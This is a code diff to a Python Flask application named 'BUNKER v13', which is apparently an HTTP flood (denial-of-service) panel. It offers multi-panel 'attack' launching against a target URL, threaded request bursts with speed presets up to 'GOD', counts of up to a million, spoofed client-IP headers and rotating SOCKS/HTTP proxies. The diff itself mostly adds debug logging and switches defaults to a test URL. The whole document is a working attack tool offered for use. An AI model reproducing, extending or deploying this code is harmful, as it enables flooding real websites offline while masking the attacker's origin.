@@ -40,6 +40,9 @@ BROWSERS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
 ]
 
+# ============================================
+# 🔥 100% WORKING REQUEST FUNCTION
+# ============================================
 def send_request(url, use_proxy=False):
     try:
         ua = random.choice(BROWSERS)
@@ -47,38 +50,32 @@ def send_request(url, use_proxy=False):
         
         headers = {
             "User-Agent": ua,
-            "Accept": "*/*",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate",
-            "Connection": "close",
+            "Cache-Control": "no-cache",
             "X-Forwarded-For": fake_ip,
             "X-Real-IP": fake_ip,
-            "X-Client-IP": fake_ip,
             "CF-Connecting-IP": fake_ip,
-            "True-Client-IP": fake_ip,
         }
         
         proxies = None
         if use_proxy and custom_proxies:
             proxy = random.choice(custom_proxies).strip()
-            if proxy.startswith("socks5://"):
-                proxy = proxy[9:]
-                proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
-            elif proxy.startswith("socks4://"):
-                proxy = proxy[9:]
-                proxies = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
-            elif proxy.startswith("http://"):
-                proxy = proxy[7:]
+            if "://" in proxy:
+                proxy = proxy.split("://", 1)[1]
+            if ":" in proxy:
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-            elif proxy.startswith("https://"):
-                proxy = proxy[8:]
-                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-            elif ":" in proxy:
-                proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
         
-        r = requests.get(url, headers=headers, proxies=proxies, timeout=15, verify=False, allow_redirects=True)
-        return r.status_code < 500
-    except:
+        # 🔥 SEND REQUEST
+        r = requests.get(url, headers=headers, proxies=proxies, timeout=30, allow_redirects=True)
+        
+        # 🔥 LOG TO VERCEL
+        print(f"✅ [{r.status_code}] {url[:60]} | IP: {fake_ip[:15]}")
+        
+        return True
+    except Exception as e:
+        print(f"❌ FAILED: {str(e)[:80]}")
         return False
 
 def attack_worker(attack_id, url, count, mode):
@@ -91,6 +88,8 @@ def attack_worker(attack_id, url, count, mode):
         
         use_proxy = (mode == "proxy" and custom_proxy_enabled and custom_proxies)
         result = send_request(url, use_proxy)
+        
+        # If proxy fails, try direct
         if not result and use_proxy:
             result = send_request(url, False)
         
@@ -100,6 +99,7 @@ def attack_worker(attack_id, url, count, mode):
         else:
             fail += 1
             attack_stats["failed"] += 1
+        
         attack_stats["total"] += 1
         
         if attack_id in attack_counters:
@@ -110,6 +110,12 @@ def run_attack(attack_id, url, count, speed, mode):
     workers = workers_map.get(speed, 40)
     req_per_worker = max(1, count // workers)
     
+    # 🔥 TEST REQUEST FIRST
+    print(f"🧪 Testing connection to: {url[:50]}")
+    test = send_request(url, False)
+    print(f"🧪 TEST RESULT: {'✅ SUCCESS' if test else '❌ FAILED'}")
+    attack_logs.append(f"🧪 TEST: {'✅ Connected' if test else '❌ Failed - Check URL'}")
+    
     attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0}
     
     with ThreadPoolExecutor(max_workers=workers) as executor:
@@ -119,11 +125,12 @@ def run_attack(attack_id, url, count, speed, mode):
             except: pass
     
     if attack_id in active_attacks: del active_attacks[attack_id]
+    print(f"🏁 ATTACK DONE: {attack_stats['success']} success")
 
 # ============================================
-# 🎨 UI - MULTI PANEL
+# 🎨 MULTI-PANEL UI
 # ============================================
-LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v12</title>
+LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v13 FINAL</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif}
@@ -143,9 +150,9 @@ input:focus{border-color:#0f0;box-shadow:0 0 20px rgba(0,255,0,0.3);outline:none
 <div class="bg"></div>
 <div class="box">
 <div class="logo">💀</div>
-<h1>BUNKER v12</h1>
-<div class="tag">FINAL • MULTI-PANEL</div>
-<p style="color:#888;font-size:0.55em">CUSTOM PANELS • FAKE IP • 100% WORKING</p>
+<h1>BUNKER v13</h1>
+<div class="tag">FINAL • DEBUG</div>
+<p style="color:#888;font-size:0.55em">TEST URL: https://httpbin.org/get</p>
 <form method="post">
 <input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
 <input type="password" name="pass" placeholder="🔐 PASSWORD">
@@ -155,7 +162,7 @@ input:focus{border-color:#0f0;box-shadow:0 0 20px rgba(0,255,0,0.3);outline:none
 </div>
 </body></html>"""
 
-DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v12</title>
+DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v13</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:8px}
@@ -198,9 +205,9 @@ body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;p
 </style></head><body>
 <div class="container">
 <div class="header">
-<div><h1>💀 BUNKER v12 FINAL</h1><div style="color:#888;font-size:0.45em;letter-spacing:2px">MULTI-PANEL • CUSTOM PROXIES • FAKE IP • 100% WORKING</div></div>
+<div><h1>💀 BUNKER v13 FINAL</h1><div style="color:#888;font-size:0.45em;letter-spacing:2px">MULTI-PANEL • DEBUG MODE • CHECK LOGS</div></div>
 <div style="display:flex;gap:8px;align-items:center">
-<span class="badge badge-on">✅ WORKING</span>
+<span class="badge badge-on">✅ v13</span>
 <a href="/logout" style="color:#f00;text-decoration:none;font-size:0.55em;font-weight:800">⏻ EXIT</a>
 </div>
 </div>
@@ -229,7 +236,7 @@ body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;p
 <button class="btn-master btn-master-stop" onclick="stopAll()">⏹️ GLOBAL STOP</button>
 </div>
 
-<div style="margin-top:8px"><h3 style="color:#ff0;margin-bottom:6px;font-size:0.65em">📜 LOGS</h3><div class="logs" id="logs"><div class="log-e">💀 BUNKER v12 FINAL READY</div></div></div>
+<div style="margin-top:8px"><h3 style="color:#ff0;margin-bottom:6px;font-size:0.65em">📜 LOGS (Check Vercel logs too!)</h3><div class="logs" id="logs"><div class="log-e">💀 BUNKER v13 FINAL</div><div class="log-e">📋 Vercel Logs: https://vercel.com/dashboard</div></div></div>
 </div>
 
 <script>
@@ -239,7 +246,7 @@ function toggleProxy(){cpOn=!cpOn;document.getElementById('proxyToggle').classLi
 
 function saveGlobalProxies(){var p=document.getElementById('globalProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>{alert('✅ '+d.count+' Proxies Saved!')})}
 
-function CP(n){return `<div class="panel" id="p${n}"><div class="panel-header"><span class="panel-num">🎯 PANEL #${n}</span><span class="panel-status st-ready" id="s${n}">READY</span></div><div class="panel-row"><div><label>URL</label><input type="text" id="u${n}" placeholder="https://target.com"></div><div><label>REQ</label><input type="number" id="c${n}" value="1000"></div><div><label>SPEED</label><select id="sp${n}"><option value="slow">Slow</option><option value="fast">Fast</option><option value="ultra" selected>ULTRA</option><option value="flash">FLASH</option><option value="god">GOD</option></select></div></div><div class="panel-row"><div><label>MODE</label><select id="m${n}"><option value="direct" selected>DIRECT</option><option value="proxy">PROXY</option></select></div><div><label>PROXIES</label><textarea id="pr${n}" rows="1" placeholder="socks5://ip:port"></textarea></div></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:3px"><button class="panel-btn" onclick="LP(${n})">⚡ LAUNCH</button><button class="panel-btn panel-btn-stop" onclick="SP(${n})">⏹️ STOP</button></div><div class="panel-counter" id="cnt${n}">READY</div></div>`}
+function CP(n){return `<div class="panel" id="p${n}"><div class="panel-header"><span class="panel-num">🎯 PANEL #${n}</span><span class="panel-status st-ready" id="s${n}">READY</span></div><div class="panel-row"><div><label>URL</label><input type="text" id="u${n}" placeholder="https://httpbin.org/get"></div><div><label>REQ</label><input type="number" id="c${n}" value="10"></div><div><label>SPEED</label><select id="sp${n}"><option value="slow">Slow</option><option value="fast" selected>Fast</option><option value="ultra">ULTRA</option><option value="flash">FLASH</option><option value="god">GOD</option></select></div></div><div class="panel-row"><div><label>MODE</label><select id="m${n}"><option value="direct" selected>DIRECT</option><option value="proxy">PROXY</option></select></div><div><label>PROXIES</label><textarea id="pr${n}" rows="1" placeholder="socks5://ip:port"></textarea></div></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:3px"><button class="panel-btn" onclick="LP(${n})">⚡ LAUNCH</button><button class="panel-btn panel-btn-stop" onclick="SP(${n})">⏹️ STOP</button></div><div class="panel-counter" id="cnt${n}">READY</div></div>`}
 
 function addPanel(){pc++;document.getElementById('panelGrid').insertAdjacentHTML('beforeend',CP(pc))}
 
@@ -292,35 +299,23 @@ def dashboard():
 @app.route('/toggle_proxy', methods=['POST'])
 def toggle_proxy():
     global custom_proxy_enabled
-    d = request.get_json()
-    custom_proxy_enabled = d.get('enabled', True)
+    custom_proxy_enabled = request.get_json().get('enabled', True)
     return jsonify({"status":"ok"})
 
 @app.route('/save_proxies', methods=['POST'])
 def save_proxies():
     global custom_proxies
-    d = request.get_json()
-    raw = d.get('proxies', '')
+    raw = request.get_json().get('proxies', '')
     custom_proxies = []
-    lines = raw.replace('\r\n','\n').replace('\r','\n').split('\n')
-    for line in lines:
-        line = line.strip()
+    for line in raw.replace('\r\n','\n').replace('\r','\n').split('\n'):
+        line = line.strip().rstrip(',;')
         if not line: continue
         if ' ' in line:
             found = re.findall(r'(?:socks[45]|https?)://[^\s]+:\d+', line)
-            if found: custom_proxies.extend(found)
-            else:
-                for part in line.split():
-                    part = part.strip().rstrip(',;')
-                    if ':' in part and len(part) > 8: custom_proxies.append(part)
-        else:
-            line = line.rstrip(',;')
-            if ':' in line and len(line) > 8: custom_proxies.append(line)
-    seen = set()
-    unique = []
-    for p in custom_proxies:
-        if p not in seen: seen.add(p); unique.append(p)
-    custom_proxies = unique
+            custom_proxies.extend(found) if found else [custom_proxies.append(p) for p in line.split() if ':' in p and len(p) > 8]
+        elif ':' in line and len(line) > 8:
+            custom_proxies.append(line)
+    custom_proxies = list(dict.fromkeys(custom_proxies))
     attack_logs.append(f"💾 {len(custom_proxies)} proxies saved")
     return jsonify({"status":"ok","count":len(custom_proxies)})
 
@@ -333,8 +328,8 @@ def attack():
     if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
     d = request.get_json()
     url = d.get('url','')
-    count = min(int(d.get('count',100)),1000000)
-    speed = d.get('speed','ultra')
+    count = min(int(d.get('count',10)),1000000)
+    speed = d.get('speed','fast')
     mode = d.get('mode','direct')
     panel = d.get('panel',0)
     if not url: return jsonify({"error":"URL required"}),400
@@ -344,16 +339,16 @@ def attack():
     
     aid = f"p{panel}_{int(time.time())}"
     active_attacks[aid] = True
-    attack_logs.append(f"🔥 P#{panel}: {url[:40]}... | {count}")
+    attack_logs.append(f"🔥 P#{panel}: {url[:50]}... | {count}")
+    print(f"🚀 ATTACK START: Panel={panel} URL={url[:50]} Count={count}")
     
     t = threading.Thread(target=run_attack, args=(aid,url,count,speed,mode))
     t.daemon=True; t.start()
-    return jsonify({"status":"started","panel":panel})
+    return jsonify({"status":"started"})
 
 @app.route('/stop_panel', methods=['POST'])
 def stop_panel():
-    d = request.get_json()
-    panel = d.get('panel',0)
+    panel = request.get_json().get('panel',0)
     for k in list(active_attacks.keys()):
         if k.startswith(f"p{panel}_"): del active_attacks[k]
     return jsonify({"status":"stopped"})
@@ -362,7 +357,7 @@ def stop_panel():
 def stop_all():
     c = len(active_attacks)
     for k in list(active_attacks.keys()): del active_attacks[k]
-    attack_logs.append(f"⏹️ GLOBAL STOP: {c} attacks")
+    attack_logs.append(f"⏹️ GLOBAL STOP: {c}")
     return jsonify({"status":"all_stopped"})
 
 @app.route('/stop', methods=['POST'])
@@ -388,7 +383,7 @@ def stats(): return jsonify({**attack_stats,"active":len(active_attacks)})
 def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'
 
 if __name__ == "__main__":
-    print("💀 BUNKER v12 FINAL")
+    print("💀 BUNKER v13 FINAL")
     import os
     port = int(os.environ.get('PORT',5000))
     app.run(host='0.0.0.0', port=port, threaded=True)
